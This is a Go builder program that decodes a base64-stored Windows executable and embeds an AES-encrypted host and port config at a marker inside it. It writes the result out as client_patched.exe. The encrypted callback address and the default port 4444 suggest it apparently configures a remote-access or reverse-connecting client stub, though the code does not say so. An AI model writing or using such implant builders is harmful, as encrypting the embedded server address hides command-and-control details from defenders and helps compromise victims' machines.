package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
)

const (
	ConfigKey = "B4A7E9C2D5F8A1B3C6E9D2F5A8B1C4D7"
	ConfigIV  = "A1B2C3D4E5F6A7B8"
	Marker    = "CONF_DATA_START:" // 16 bytes
	ConfigLen = 2048
)

type Config struct {
	Host string `json:"host"`
	Port int    `json:"port"`
}

func pkcs7Padding(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padtext...)
}

func encrypt(data []byte, totalLen int) ([]byte, error) {
	block, err := aes.NewCipher([]byte(ConfigKey))
	if err != nil {
		return nil, err
	}

	// First, pad the actual JSON data correctly
	padded := pkcs7Padding(data, aes.BlockSize)

	// Then, if we need to fill a specific total length (for the resource),
	// we fill the rest with valid PKCS7 padding of that length if possible,
	// or just pad to the nearest block and then fill with zeros (but C side expects valid padding).
	// Actually, the easiest way to satisfy C's BCRYPT_BLOCK_PADDING is to ensure the buffer
	// passed to Decrypt is exactly what was output by Encrypt.

	// We want the final encrypted blob to be exactly totalLen.
	// totalLen is 2048 - 16 = 2032.
	// 2032 / 16 = 127 blocks.

	remaining := totalLen - len(padded)
	if remaining < 0 {
		return nil, fmt.Errorf("data too large")
	}

	// Add more blocks to reach totalLen. These will be decrypted as extra data by the C client
	// but cJSON_Parse will ignore them after the first valid JSON object.
	// To keep it valid PKCS7, we can just pad the whole buffer once.

	rawBuffer := make([]byte, totalLen)
	copy(rawBuffer, data)

	// Apply PKCS7 padding to the entire remaining space
	padLen := totalLen - len(data)
	for i := len(data); i < totalLen; i++ {
		rawBuffer[i] = byte(padLen)
	}

	ciphertext := make([]byte, totalLen)
	mode := cipher.NewCBCEncrypter(block, []byte(ConfigIV))

	// Encrypt in blocks
	for i := 0; i < totalLen; i += aes.BlockSize {
		mode.CryptBlocks(ciphertext[i:i+aes.BlockSize], rawBuffer[i:i+aes.BlockSize])
	}

	return ciphertext, nil
}

func main() {
	ip := flag.String("ip", "127.0.0.1", "Server IP address")
	port := flag.Int("port", 4444, "Server Port")
	flag.Parse()

	// Read base64.txt
	b64Data, err := os.ReadFile("base64.txt")
	if err != nil {
		log.Fatalf("Error reading base64.txt: %v", err)
	}

	// Decode EXE
	exeData, err := base64.StdEncoding.DecodeString(string(b64Data))
	if err != nil {
		log.Fatalf("Error decoding base64: %v", err)
	}

	// Create Config JSON
	cfg := Config{
		Host: *ip,
		Port: *port,
	}
	cfgBytes, err := json.Marshal(cfg)
	if err != nil {
		log.Fatalf("Error marshaling config: %v", err)
	}

	// Encrypt Config - total length for ciphertext should be 2032 (2048 - 16 marker)
	encrypted, err := encrypt(cfgBytes, ConfigLen-len(Marker))
	if err != nil {
		log.Fatalf("Error encrypting config: %v", err)
	}

	// Prepare the patch block
	patchBlock := make([]byte, ConfigLen)
	copy(patchBlock, Marker)
	copy(patchBlock[len(Marker):], encrypted)

	// Find Marker in EXE
	markerBytes := []byte(Marker)
	index := bytes.Index(exeData, markerBytes)
	if index == -1 {
		log.Fatalf("Marker not found in EXE")
	}

	// Apply Patch
	copy(exeData[index:index+ConfigLen], patchBlock)

	// Save to file
	outputName := "client_patched.exe"
	err = os.WriteFile(outputName, exeData, 0755)
	if err != nil {
		log.Fatalf("Error writing output file: %v", err)
	}

	fmt.Printf("Build successful: %s\n", outputName)
}
